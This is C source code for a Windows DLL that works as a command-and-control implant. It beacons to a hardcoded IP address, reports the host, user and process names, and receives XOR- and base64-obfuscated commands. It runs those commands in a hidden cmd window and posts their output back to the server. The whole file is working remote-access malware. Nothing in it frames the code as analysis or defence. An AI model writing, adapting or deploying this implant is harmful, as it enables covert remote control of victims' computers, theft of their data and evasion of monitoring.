// compile with : x86_64-w64-mingw32-gcc -O2 -Wall -shared -o agent.dll http_agent_dll.c -lwininet -lpsapi
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")

#define XOR_KEY "mysecretkey"
#define XOR_KEYLEN (sizeof(XOR_KEY) - 1)
#define USER_AGENT "Mozilla/5.0"
#define HOSTNAME "217.154.13.193"
#define PORT 80
#define HEADER "Accept: application/json\r\n"
#define PATH_API "/api"
#define BEACON_INTERVAL 5







void wininet_error(const char* msg) {
    DWORD err = GetLastError();
    char buf[256];
    snprintf(buf, sizeof(buf), "[!] %s (GetLastError=%lu)\n", msg, err);
    OutputDebugStringA(buf);
}

void xor_data(char* data, size_t len, const char* key, size_t klen) {
    for (size_t i = 0; i < len; ++i)
        data[i] ^= key[i % klen];
}

const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
void base64_encode(const unsigned char* input, size_t in_len, char* out, size_t out_size) {
    size_t olen = 0;
    int val = 0, valb = -6;
    for (size_t i = 0; i < in_len; i++) {
        val = (val << 8) + input[i];
        valb += 8;
        while (valb >= 0) {
            if (olen + 1 < out_size) out[olen++] = b64_chars[(val >> valb) & 0x3F];
            valb -= 6;
        }
    }
    if (valb > -6 && olen + 1 < out_size)
        out[olen++] = b64_chars[((val << 8) >> (valb + 8)) & 0x3F];
    while (olen % 4 && olen + 1 < out_size)
        out[olen++] = '=';
    if (olen < out_size)
        out[olen] = 0;
}

int b64_reverse_table[256];
void build_b64_reverse_table() {
    memset(b64_reverse_table, -1, sizeof(b64_reverse_table));
    for (int i = 0; i < 64; i++)
        b64_reverse_table[(unsigned char)b64_chars[i]] = i;
}

int base64_decode(const char* in, unsigned char* out, size_t out_size) {
    build_b64_reverse_table();
    int len = strlen(in), outl = 0, val = 0, valb = -8;
    for (int i = 0; i < len; i++) {
        int tbl = b64_reverse_table[(unsigned char)in[i]];
        if (tbl == -1) break;
        val = (val << 6) + tbl;
        valb += 6;
        if (valb >= 0) {
            if (outl < (int)out_size)
                out[outl++] = (unsigned char)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return outl;
}

void get_hostname(char* out, DWORD len) {
    if (!GetComputerNameA(out, &len)) strcpy(out, "unknown_host");
}
void get_username(char* out, DWORD len) {
    if (!GetUserNameA(out, &len)) strcpy(out, "unknown_user");
}
void get_process_name(char* out, DWORD len) {
    if (GetModuleFileNameA(NULL, out, len)) {
        char* p = strrchr(out, '\\');
        if (p) memmove(out, p + 1, strlen(p));
    }
    else strcpy(out, "unknown_process");
}
void generate_agent_id(char* out, size_t outlen) {
    char host[128] = "", user[128] = "", proc[128] = "";
    DWORD sz = 128;
    get_hostname(host, sz);
    sz = 128;
    get_username(user, sz);
    sz = 128;
    get_process_name(proc, sz);
    snprintf(out, outlen, "%s_%s_%s", host, user, proc);
}

size_t exec_cmd(const char* cmd, char* output, size_t outsz) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE readPipe = NULL, writePipe = NULL;

    if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
        snprintf(output, outsz, "ERROR: CreatePipe failed");
        return strlen(output);
    }

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = writePipe;
    si.hStdError  = writePipe;

    char cmdline[512];
    snprintf(cmdline, sizeof(cmdline), "cmd /c %s", cmd);

    PROCESS_INFORMATION pi = {0};
    BOOL ok = CreateProcessA(
        NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);
    if (!ok) {
        snprintf(output, outsz, "ERROR: CreateProcess failed");
        CloseHandle(readPipe);
        CloseHandle(writePipe);
        return strlen(output);
    }

    CloseHandle(writePipe);
    DWORD total = 0, read = 0;
    while (total < outsz - 1 && ReadFile(readPipe, output + total, (DWORD)(outsz - 1 - total), &read, NULL) && read > 0) {
        total += read;
    }

    output[total] = '\0'; // pour usage texte, même si ce n'est pas toujours garanti pour binaire

    CloseHandle(readPipe);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return total;
}

int parse_tasks(const char* json, char tasks[][1024], int max_tasks) {
    const char* p = strstr(json, "\"tasks\"");
    if (!p) return 0;
    p = strchr(p, '['); if (!p) return 0;
    const char* q = strchr(p, ']'); if (!q) return 0;
    int nt = 0;
    for (const char* s = p; s < q && nt < max_tasks;) {
        s = strchr(s, '"'); if (!s || s > q) break;
        const char* e = strchr(s + 1, '"'); if (!e || e > q) break;
        size_t l = e - (s + 1);
        if (l > 0 && l < 1024) {
            strncpy(tasks[nt], s + 1, l);
            tasks[nt][l] = 0;
            nt++;
        }
        s = e + 1;
    }
    return nt;
}

int http_post(const char* host, int port, const char* path, const char* user_agent, const char* extra_headers, const char* data, char* response, size_t resp_len) {
    HINTERNET hInternet = InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { wininet_error("InternetOpenA failed"); return 0; }
    HINTERNET hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { wininet_error("InternetConnectA failed"); InternetCloseHandle(hInternet); return 0; }
    const char *acceptTypes[] = {"*/*", NULL};
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path, NULL, NULL, acceptTypes, 0, 0);
    if (!hRequest) { wininet_error("HttpOpenRequestA failed (POST)"); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return 0; }
    char headers[2048];
    snprintf(headers, sizeof(headers), "%sContent-Type: application/json\r\n", extra_headers);
    BOOL res = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)data, strlen(data));
    if (!res) { wininet_error("HttpSendRequestA failed (POST)"); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return 0; }

    DWORD totalRead = 0, bytesRead;
    if (response) response[0] = 0;
    char temp[4096];
    while (response && InternetReadFile(hRequest, temp, sizeof(temp)-1, &bytesRead) && bytesRead != 0 && totalRead < resp_len-1) {
        if (bytesRead + totalRead > resp_len-1) bytesRead = (DWORD)(resp_len-1 - totalRead);
        memcpy(response + totalRead, temp, bytesRead);
        totalRead += bytesRead;
    }
    if (response) response[totalRead] = 0;

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return 1;
}

void agent_beacon() {
    char agent_id[512];
    generate_agent_id(agent_id, sizeof(agent_id));

    while (1) {
        char post_data[1024];
        char host[128] = "", user[128] = "", proc[128] = "";
        DWORD sz = 128;
        get_hostname(host, sz);
        sz = 128;
        get_username(user, sz);
        sz = 128;
        get_process_name(proc, sz);

        snprintf(post_data, sizeof(post_data),
            "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"process_name\":\"%s\"}",
            agent_id, host, user, proc);

        char response[8192];
        int ok = http_post(HOSTNAME, PORT, PATH_API, USER_AGENT, HEADER, post_data, response, sizeof(response));
        if (!ok) continue;

        char tasks[8][1024];
        int num_tasks = parse_tasks(response, tasks, 8);
        for (int t = 0; t < num_tasks; t++) {
            unsigned char decoded[1024] = {0};
            int dec_len = base64_decode(tasks[t], decoded, sizeof(decoded));
            xor_data((char*)decoded, dec_len, XOR_KEY, XOR_KEYLEN);

            char cmd_out[8192] = {0};
            size_t outlen = exec_cmd((char*)decoded, cmd_out, sizeof(cmd_out));

            xor_data(cmd_out, outlen, XOR_KEY, XOR_KEYLEN);

            char out_b64[16384] = { 0 };
            base64_encode((unsigned char*)cmd_out, outlen, out_b64, sizeof(out_b64));

            char result_json[16384];
            snprintf(result_json, sizeof(result_json),
                "{\"agent_id\":\"%s\",\"result\":\"%s\"}", agent_id, out_b64);
            char res_path[1024];
            snprintf(res_path, sizeof(res_path), "/agent/%s/push_result", agent_id);

            http_post(HOSTNAME, PORT, res_path, USER_AGENT, HEADER, result_json, NULL, 0);
        }
        Sleep(BEACON_INTERVAL * 1000);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID reserved) {
    return TRUE;
}

DWORD WINAPI agent_thread(LPVOID _) {
    agent_beacon();
    return 0;
}

__declspec(dllexport)
void go(void* param) {
    HANDLE h = CreateThread(NULL, 0, agent_thread, NULL, 0, NULL); 
    if (h) {
        WaitForSingleObject(h, INFINITE);
        CloseHandle(h);
    }
}
